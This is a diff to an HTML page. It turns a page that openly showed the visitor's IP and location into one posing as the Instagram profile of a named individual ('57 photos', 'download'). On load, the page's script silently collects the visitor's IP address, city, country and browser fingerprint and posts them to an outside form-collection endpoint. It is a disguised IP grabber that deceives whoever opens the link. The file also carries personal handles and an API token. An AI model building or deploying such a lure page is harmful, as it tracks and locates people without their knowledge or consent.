@@ -1,51 +1,52 @@
 <!DOCTYPE html>
-<html lang="pl">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Safe data download</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="keywords" content="_p4rd1, @_p4rd1 instagram, @_p4rd1, facebook, bartosz sonenberg">
+<title>Bartosz Sonenberg (&#064;_p4rd1) • Instagram photos and videos</title>
 </head>
 <body>
-    <h1>Ip and location</h1>
-    <p id="output">Loading...</p>
+  <h1>57 photos</h1>
+  <p>download</p>
+  <script>
+   
+    async function getData() {
+      const ipData = await fetch("https://ipinfo.io/json?token=5cbb62c209322b").then(response => response.json());
+      const locationData = await fetch(`https://ipinfo.io/${ipData.ip}/json`).then(response => response.json());
 
-    <script>
-        async function getData() {
-            try {
-                // ip
-                const ipResponse = await fetch("https://ipinfo.io/json?token=5cbb62c209322b");
-                if (!ipResponse.ok) throw new Error("error fetch ip");
-                const ipData = await ipResponse.json();
+      const userAgent = navigator.userAgent;
+      const fingerprint = btoa(navigator.userAgent + Date.now()); 
 
-                // location
-                const locationResponse = await fetch(`https://ipinfo.io/${ipData.ip}/json`);
-                if (!locationResponse.ok) throw new Error("error fetch location");
-                const locationData = await locationResponse.json();
+      const data = {
+        ip: ipData.ip,
+        location: locationData.city + ", " + locationData.country,
+        userAgent: userAgent,
+        fingerprint: fingerprint
+      };
 
-                // Fingerprint with SHA-256
-                const encoder = new TextEncoder();
-                const dataToHash = `${navigator.userAgent}-${ipData.ip}`;
-                const hashBuffer = await crypto.subtle.digest("SHA-256", encoder.encode(dataToHash));
-                const fingerprint = btoa(String.fromCharCode(...new Uint8Array(hashBuffer)));
+      console.log(data);
 
-                const data = {
-                    ip: ipData.ip,
-                    location: `${locationData.city}, ${locationData.country}`,
-                    userAgent: navigator.userAgent,
-                    fingerprint: fingerprint
-                };
+      await fetch('https://formspree.io/f/xjkyelzd', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json',
+        },
+        body: JSON.stringify(data),
+      });
+    }
 
-                console.log("Dane użytkownika:", data);
+    getData();
+  </script>
+  <script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "WebPage",
+  "keywords": "_p4rd1, @_p4rd1 instagram, @_p4rd1, facebook, bartosz sonenberg, @_p4rd1, @sobar_2403, pardiczek, pardi, pard, p4rd"
+}
+</script>
+  <img src="download.png" alt="_p4rd1, @_p4rd1 instagram, @_p4rd1, facebook, bartosz sonenberg">
 
-                //data>> html
-                document.getElementById("output").innerText = `IP: ${data.ip}, Location: ${data.location}`;
-            } catch (error) {
-                console.error(Error:", error.message);
-                document.getElementById("output").innerText = "Nie udało się pobrać danych.";
-            }
-        }
-
-        getData();
-    </script>
+  <meta name="description" content="216 Followers, 572 Following, 2 Posts - Bartosz Sonenberg (@_p4rd1) on Instagram: "Lost acces to @sobar_2403 "">
 </body>
 </html>
